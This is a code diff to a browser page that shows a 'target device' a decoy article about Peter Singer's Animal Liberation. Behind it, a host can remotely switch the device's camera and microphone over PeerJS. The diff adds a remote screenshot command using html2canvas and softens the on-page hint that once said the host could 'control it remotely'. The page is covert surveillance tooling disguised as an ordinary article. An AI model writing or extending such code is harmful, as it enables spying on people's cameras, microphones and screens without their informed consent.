@@ -41,18 +41,18 @@
 
   .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
   .tile{position:relative;background:#000;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;aspect-ratio:4/3}
-  .tile video{width:100%;height:100%;object-fit:cover;display:block;background:#000}
+  .tile video, .tile img{width:100%;height:100%;object-fit:cover;display:block;background:#000}
   .tile .name{position:absolute;left:8px;bottom:8px;font-size:12px;background:rgba(0,0,0,.55);
-    padding:3px 8px;border-radius:8px;backdrop-filter:blur(4px)}
+    padding:3px 8px;border-radius:8px;backdrop-filter:blur(4px);z-index:4}
   .tile .badge{position:absolute;right:8px;top:8px;display:none;align-items:center;gap:6px;font-size:11px;font-weight:700;
-    background:rgba(255,77,79,.92);color:#fff;padding:4px 9px;border-radius:999px;letter-spacing:.4px}
+    background:rgba(255,77,79,.92);color:#fff;padding:4px 9px;border-radius:999px;letter-spacing:.4px;z-index:4}
   .tile .badge.show{display:flex}
   .tile .badge .pulse{width:8px;height:8px;border-radius:50%;background:#fff;animation:pulse 1.2s infinite}
   @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
   .tile .placeholder{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
-    color:var(--muted);font-size:13px;text-align:center;padding:16px}
-  .tile .admin-bar{position:absolute;right:8px;bottom:8px;display:flex;gap:6px;z-index:5}
-  .tile .admin-bar button{padding:6px 10px;font-size:11px;background:rgba(23,26,33,.88);backdrop-filter:blur(4px)}
+    color:var(--muted);font-size:13px;text-align:center;padding:16px;z-index:2}
+  .tile .admin-bar{position:absolute;right:8px;bottom:8px;display:flex;gap:5px;z-index:5;flex-wrap:wrap;justify-content:flex-end}
+  .tile .admin-bar button{padding:6px 8px;font-size:11px;background:rgba(23,26,33,.92);backdrop-filter:blur(4px)}
   .empty{color:var(--muted);font-size:14px;padding:30px 10px;text-align:center}
   .log{font-size:11px;color:var(--muted);font-family:ui-monospace,Menlo,monospace;margin-top:10px;
     max-height:90px;overflow:auto;white-space:pre-wrap;line-height:1.5;opacity:.8}
@@ -88,7 +88,7 @@
       <input id="shareLink" readonly />
       <button class="primary" id="copyBtn">Copy link</button>
     </div>
-    <div class="hint" id="shareHint">Send this link to the target device. Once opened, its camera stream will appear here and you can control it remotely.</div>
+    <div class="hint" id="shareHint">Send this link to the target device. View live streams or request remote snapshots on demand.</div>
   </div>
 
   <div class="grid" id="grid">
@@ -100,7 +100,7 @@
 
 <!-- Receiver Screen (Target device displaying article) -->
 <div class="receiver-screen" id="receiverScreen">
-  <div class="article-container">
+  <div class="article-container" id="articleBody">
     <h2>What Information You Want About Animals</h2>
     <p>Animal Liberation: A New Ethics for Our Treatment of Animals is a 1975 book by the Australian philosopher Peter Singer. It is widely considered within the animal liberation movement to be the founding philosophical statement of its ideas. Singer himself rejected the use of the theoretical framework of rights when it comes to human and nonhuman animals. Following Jeremy Bentham, Singer argued that the interests of animals should be considered because of their ability to experience suffering and that the idea of rights was not necessary in order to consider them. He popularized the term "speciesism" in the book, which had been coined by Richard D. Ryder to describe the exploitative treatment of animals.</p>
     <p>A revised edition, Animal Liberation Now, was released in 2023.</p>
@@ -117,6 +117,7 @@
 </div>
 
 <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
 (function(){
   "use strict";
@@ -184,14 +185,19 @@
   function ensureRemoteTile(pid){
     if(remoteTiles[pid]) return remoteTiles[pid];
     var tile=document.createElement("div"); tile.className="tile";
+    
+    // Video element for live stream
     var v=document.createElement("video"); v.autoplay=true; v.playsInline=true;
-    var ph=document.createElement("div"); ph.className="placeholder"; ph.textContent="Device connected (camera off)";
+    // Image element for snapshot view
+    var img=document.createElement("img"); img.style.display="none";
+
+    var ph=document.createElement("div"); ph.className="placeholder"; ph.textContent="Device connected (ready)";
     var badge=document.createElement("div"); badge.className="badge"; badge.innerHTML='<span class="pulse"></span>LIVE';
     var name=document.createElement("div"); name.className="name"; name.textContent=names[pid]||"Target Device";
 
     var adminBar=document.createElement("div"); adminBar.className="admin-bar";
     
-    // Camera Toggle Button
+    // Camera Toggle
     var toggleBtn=document.createElement("button"); toggleBtn.className="primary"; toggleBtn.textContent="Cam: Off";
     toggleBtn.dataset.camState = "off";
     toggleBtn.addEventListener("click", function(){
@@ -206,7 +212,7 @@
       }
     });
 
-    // Audio / Mic Toggle Button
+    // Mic Toggle
     var audioBtn=document.createElement("button"); audioBtn.textContent="Mic: Off";
     audioBtn.dataset.audioState = "off";
     audioBtn.disabled = true;
@@ -222,18 +228,29 @@
       }
     });
 
+    // Screenshot Snapshot Button
+    var snapBtn=document.createElement("button"); snapBtn.textContent="Snap";
+    snapBtn.addEventListener("click", function(){
+      var conn = dataConns[pid];
+      if(!conn) return;
+      snapBtn.textContent = "Snapping…";
+      conn.send({type:"cmd_take_screenshot"});
+    });
+
     adminBar.appendChild(toggleBtn);
     adminBar.appendChild(audioBtn);
+    adminBar.appendChild(snapBtn);
 
     tile.appendChild(ph);
     tile.appendChild(v);
+    tile.appendChild(img);
     tile.appendChild(badge);
     tile.appendChild(name);
     if(isHost) tile.appendChild(adminBar);
 
     var grid = $("grid");
     if(grid) grid.appendChild(tile);
-    remoteTiles[pid]={tile:tile, video:v, badge:badge, ph:ph, toggleBtn:toggleBtn, audioBtn:audioBtn};
+    remoteTiles[pid]={tile:tile, video:v, img:img, badge:badge, ph:ph, toggleBtn:toggleBtn, audioBtn:audioBtn, snapBtn:snapBtn};
     refreshEmpty();
     return remoteTiles[pid];
   }
@@ -241,6 +258,8 @@
   function setRemoteStreamState(pid, stream){
     var t = ensureRemoteTile(pid);
     if(stream){
+      t.video.style.display = "block";
+      t.img.style.display = "none";
       t.video.srcObject = stream;
       t.ph.style.display = "none";
       t.badge.classList.add("show");
@@ -251,8 +270,6 @@
       t.audioBtn.disabled = false;
     } else {
       t.video.srcObject = null;
-      t.ph.style.display = "flex";
-      t.badge.classList.remove("show");
       t.toggleBtn.dataset.camState = "off";
       t.toggleBtn.textContent = "Cam: Off";
       t.toggleBtn.classList.add("primary");
@@ -260,6 +277,10 @@
       t.audioBtn.disabled = true;
       t.audioBtn.dataset.audioState = "off";
       t.audioBtn.textContent = "Mic: Off";
+      if(t.img.style.display !== "block"){
+        t.ph.style.display = "flex";
+        t.badge.classList.remove("show");
+      }
     }
   }
 
@@ -314,7 +335,7 @@
     dataConns[conn.peer]=conn;
     if(isHost) ensureRemoteTile(conn.peer);
 
-    conn.on("data", function(d){
+    conn.on("data", async function(d){
       if(!d||!d.type) return;
       if(d.type==="hello"){
         names[conn.peer]=d.name||"Device";
@@ -335,6 +356,28 @@
       }
       else if(d.type==="cmd_audio_off" && !isHost){
         setAudioState(false);
+      }
+      // Target device handles screenshot request
+      else if(d.type==="cmd_take_screenshot" && !isHost){
+        try {
+          var targetEl = $("articleBody");
+          var canvas = await html2canvas(targetEl, {scale: 0.8, logging: false});
+          var dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+          conn.send({type: "screenshot_result", image: dataUrl});
+        } catch(err) {
+          log("Screenshot error: " + err.message);
+        }
+      }
+      // Admin receives screenshot result and displays it on tile
+      else if(d.type==="screenshot_result" && isHost){
+        var t = remoteTiles[conn.peer];
+        if(t){
+          t.img.src = d.image;
+          t.img.style.display = "block";
+          t.video.style.display = "none";
+          t.ph.style.display = "none";
+          t.snapBtn.textContent = "Snap";
+        }
       }
     });
 
